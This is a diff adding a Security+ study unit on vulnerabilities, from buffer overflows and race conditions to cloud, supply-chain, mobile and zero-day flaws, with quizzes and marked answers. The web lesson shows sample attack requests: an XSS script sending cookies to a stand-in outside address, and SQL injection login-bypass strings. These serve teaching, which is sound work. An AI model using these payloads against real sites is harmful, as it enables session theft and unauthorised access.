@@ -1,0 +1,193 @@
+# Unit: u05 | 5. Vulnerabilities | Threats, vulnerabilities and mitigations
+
+A **vulnerability** is a weakness that a threat can use to cause harm. It may be a coding mistake, a bad setting, an old device, or a trust relationship that goes too far. This unit walks through the kinds of vulnerability Security+ expects you to recognise: in applications and operating systems, on the web, in hardware, in virtual machines and the cloud, in the supply chain, in cryptography and configuration, on mobile devices, and the **zero-day** that nobody knew about.
+
+Remember the difference: a **vulnerability** is the weakness, an **exploit** is the code or method that uses it, and a **threat** is whoever or whatever might do so.
+
+## Lesson: l0501 | Application, OS and web vulnerabilities
+
+### Memory problems
+
+- **Buffer overflow**: a program writes more data into a memory area (a buffer) than it can hold, and the extra overwrites nearby memory. An attacker who controls the extra data may crash the program or make it run their own code. It comes from missing **bounds checking**. Defences: safe languages and functions, input validation, and operating system protections such as **ASLR** (address space layout randomization) and **DEP** (data execution prevention).
+- **Memory injection**: the attacker places malicious code into the memory of a running, legitimate process (for example through DLL injection) so it runs with that process's rights and is harder to spot. Much "fileless" malware works this way, leaving little on disk.
+
+### Race conditions
+
+A **race condition** happens when the result depends on the timing of two or more events and an attacker can slip in between them. The classic form is **time-of-check to time-of-use** (**TOC/TOU**, or TOCTOU): the program checks something (that a user may write a file) and then uses it a moment later, but in between the attacker swaps the file (for example for a link to a system file). The check passed, but on the wrong thing. Defences: do the check and the use as one atomic step, and use proper locking.
+
+> TOC/TOU: "checked one thing, used another". The gap between check and use is the vulnerability.
+
+### Malicious update
+
+An attacker compromises the update channel or the update itself, so a legitimate-looking software update installs malware. Users trust updates, which makes this powerful. Defences: **code signing** with checks of the signature before installing, protected build and update servers, and verifying hashes.
+
+### Operating system vulnerabilities
+
+Operating systems are large and complex: flaws in the kernel, drivers, services and built-in tools are found all the time. Typical results are privilege escalation (a normal user becomes administrator or root) and remote code execution through an exposed service. Defences: patch promptly, remove unneeded features and services, run with least privilege, and use endpoint protection.
+
+### Web vulnerabilities
+
+- **SQL injection (SQLi)**: user input is put straight into a database query, so specially crafted input changes the query itself. Typing `' OR 1=1 --` into a login field may make the query true for every row, logging the attacker in or dumping data. Defences: **parameterized queries** (prepared statements), input validation, least-privilege database accounts, a web application firewall.
+- **Cross-site scripting (XSS)**: a site includes user-supplied input in a page without encoding it, so an attacker's script runs in **other users' browsers** in the context of that site. It can steal session cookies or change what the user sees.
+  - **Reflected** XSS: the script is in a link or request and bounces straight back in the response (the victim must click a crafted link).
+  - **Stored** (persistent) XSS: the script is saved on the site, for example in a comment, and runs for everyone who views the page.
+  - Defences: output encoding, input validation, a Content Security Policy, and HttpOnly cookies.
+
+```file
+GET /search?q=<script>document.location='https://203.0.113.9/c?'+document.cookie</script>
+GET /login?user=admin'--&pass=x
+```
+
+The first request is a reflected XSS attempt (a script sent in the search box); the second tries SQL injection by ending the query early with a comment.
+
+> SQL injection attacks the database through the server. XSS attacks other users through their browsers.
+
+@quiz
+? A program checks that a user may open `report.txt`, and a split second later opens it. In between, an attacker replaces the file with a link to the password file. What is this vulnerability?
+- Buffer overflow
++ A race condition (time-of-check to time-of-use)
+- SQL injection
+- Malicious update
+! The program checked one object and used another because of the gap between check and use: TOC/TOU.
+? A forum lets users post comments. One comment contains a script that runs in every visitor's browser and sends their session cookie to an attacker. What is this?
+- Reflected XSS
++ Stored XSS
+- SQL injection
+- Memory injection
+! The script is saved on the site and runs for every viewer, which makes it stored (persistent) XSS.
+? Which defence most directly prevents SQL injection?
+- Full disk encryption
+- ASLR
++ Parameterized queries
+- Code signing
+! Parameterized queries keep user input as data, so it can't change the structure of the query.
+? Attackers break into a software vendor's build server and add malware to the next official release, which customers install automatically. What is this?
++ A malicious update
+- A buffer overflow
+- Typosquatting
+- A race condition
+! A trusted update channel delivered the malware: a malicious update.
+@end
+
+## Lesson: l0502 | Hardware, virtualization, cloud and supply chain
+
+### Hardware
+
+- **Firmware**: the low-level software inside devices (BIOS/UEFI, network cards, drives, routers, IoT devices). Firmware flaws survive reinstalling the operating system and are often patched rarely, if ever. Malware in firmware is very hard to remove. Keep firmware updated and use secure boot to check its integrity.
+- **End-of-life (EOL)**: the maker no longer sells, supports or patches the product. (Some vendors also use "end of service life" or "end of support".) New flaws stay open.
+- **Legacy**: old hardware or software still in use, often because a critical application depends on it. It may not support modern security (encryption, MFA) even before it is end of life. Isolate it and plan its replacement.
+
+### Virtualization
+
+- **VM escape**: code running inside a virtual machine breaks out and reaches the **hypervisor** or other VMs on the same host. It is serious because one compromised VM could expose every VM on the host. Defences: patch the hypervisor and guest tools, limit shared features (shared folders, clipboard), and separate sensitive workloads onto different hosts.
+- **Resource reuse**: memory, disk space or other resources released by one VM are given to another without being wiped, so the new VM may read leftover data. Hypervisors and cloud providers must clear resources before reuse.
+- **VM sprawl**: so many VMs that some are forgotten and go unpatched (a management, not a technical, flaw).
+
+### Cloud-specific
+
+- **Misconfigured storage**: cloud storage buckets left publicly readable are a frequent cause of data leaks.
+- **Weak identity and access management**: too many permissions, no MFA on admin accounts, long-lived access keys left in code.
+- **Insecure APIs**: cloud services are managed through APIs; unprotected or poorly checked APIs expose data and control.
+- **Shared tenancy**: many customers share the same hardware, so isolation flaws (like resource reuse) matter.
+- **Shared responsibility confusion**: the customer assumes the provider protects something that is actually the customer's job (unit 8).
+
+### Supply chain
+
+You inherit the weaknesses of everyone you depend on:
+
+- **Service provider**: an MSP, cloud provider or outsourcer with access to your systems or data can be breached or make mistakes.
+- **Hardware provider**: counterfeit or tampered components, or devices shipped with malicious firmware.
+- **Software provider**: vulnerable or malicious code in commercial software, open-source libraries, or updates. One library used by thousands of programs can make all of them vulnerable at once. Keep a **software bill of materials** (SBOM) so you know which components you use.
+
+Defences: vet suppliers, buy from authorized sources, check signatures and hashes, monitor for vulnerabilities in your components, and limit what partners can reach.
+
+@quiz
+? A malicious program in a guest virtual machine gains access to the host's hypervisor and to the other guests. What is this called?
+- Resource reuse
++ VM escape
+- VM sprawl
+- Side loading
+! Breaking out of a VM to reach the hypervisor or other VMs is VM escape.
+? A widely used open-source logging library is found to have a critical flaw. Thousands of applications that include it are now at risk. Which kind of vulnerability is this?
+- Firmware vulnerability
+- Misconfiguration
++ Software supply chain vulnerability
+- Race condition
+! A weakness in a component many products depend on spreads to all of them; an SBOM helps find where it is used.
+? Why is malware in a device's firmware especially hard to deal with?
++ It survives reinstalling the operating system and firmware is rarely updated
+- It always spreads by email
+- It only works on virtual machines
+- Antivirus removes it at every reboot
+! Firmware sits below the operating system, so wiping the OS doesn't remove it.
+? A new cloud VM finds fragments of another customer's data in its newly allocated memory. Which vulnerability does this show?
+- VM escape
++ Resource reuse without clearing
+- Malicious update
+- Jailbreaking
+! Resources handed to a new tenant must be wiped first; otherwise old data leaks.
+@end
+
+## Lesson: l0503 | Cryptographic, misconfiguration, mobile and zero-day
+
+### Cryptographic vulnerabilities
+
+- Weak or outdated algorithms: DES, 3DES, RC4, MD5 and SHA-1 for signatures.
+- Short keys (for example RSA 1024).
+- Old protocol versions: SSL 2.0/3.0, TLS 1.0 and 1.1. Use TLS 1.2 or 1.3.
+- Poor key management: hard-coded keys in code, keys shared by many systems, keys never rotated.
+- Weak random numbers, which make keys guessable.
+- Expired or self-signed certificates that users learn to click past.
+- Implementation flaws: even a strong algorithm can be badly coded.
+
+### Misconfiguration
+
+Probably the most common vulnerability of all:
+
+- Default settings and credentials left unchanged.
+- Unneeded services and open ports.
+- Too-generous permissions ("Everyone: Full control", public cloud storage).
+- Detailed error messages that reveal software versions and paths.
+- Security features turned off "to make it work" and never turned back on.
+- Logging disabled.
+
+Defences: secure baselines, configuration management and regular checks against benchmarks (for example the CIS Benchmarks).
+
+### Mobile devices
+
+- **Side loading**: installing apps from outside the official app store (for example an Android APK from a website). Those apps skip the store's checks and may contain malware.
+- **Jailbreaking** (iOS) and **rooting** (Android): removing the maker's restrictions to get full control. It disables built-in protections, may stop updates and lets any app gain high privileges. Mobile device management (MDM) can detect it and block the device from company data.
+- Other mobile risks: missing updates on older phones, insecure public Wi-Fi, lost or stolen devices without encryption or a lock screen.
+
+> Side loading = apps from outside the store. Jailbreaking/rooting = removing the operating system's own restrictions.
+
+### Zero-day
+
+A **zero-day** vulnerability is one that the vendor doesn't know about yet, or knows about but hasn't fixed, so there is no patch: defenders have had "zero days" to fix it. A zero-day exploit is an attack that uses it. Signature-based tools usually can't recognise it. Defences are layered: least privilege, segmentation, application allow lists, behaviour-based detection (EDR), and fast patching as soon as a fix appears.
+
+@quiz
+? An employee downloads an app installer from a forum and installs it on a company Android phone, bypassing the official store. What is this?
+- Jailbreaking
++ Side loading
+- Typosquatting
+- Resource reuse
+! Installing apps from outside the official store is side loading; jailbreaking/rooting removes the OS restrictions.
+? Attackers use a flaw in a popular browser that the vendor has not yet heard of. No patch exists. What kind of vulnerability is it?
+- Legacy
+- Misconfiguration
++ Zero-day
+- End-of-life
+! A flaw with no fix available, unknown to the vendor, is a zero-day.
+? A scan finds that a web server still accepts TLS 1.0 connections and uses 1024-bit RSA. What category of weakness is this?
++ Cryptographic vulnerability
+- Race condition
+- VM escape
+- Watering hole
+! Outdated protocols and short keys are cryptographic weaknesses; move to TLS 1.2 or 1.3 and stronger keys.
+? A cloud storage bucket holding customer invoices was set to allow public read access by mistake. What is the vulnerability?
+- Zero-day
++ Misconfiguration
+- Buffer overflow
+- Firmware flaw
+! A wrong setting exposed the data: a misconfiguration, one of the most common causes of breaches.
+@end
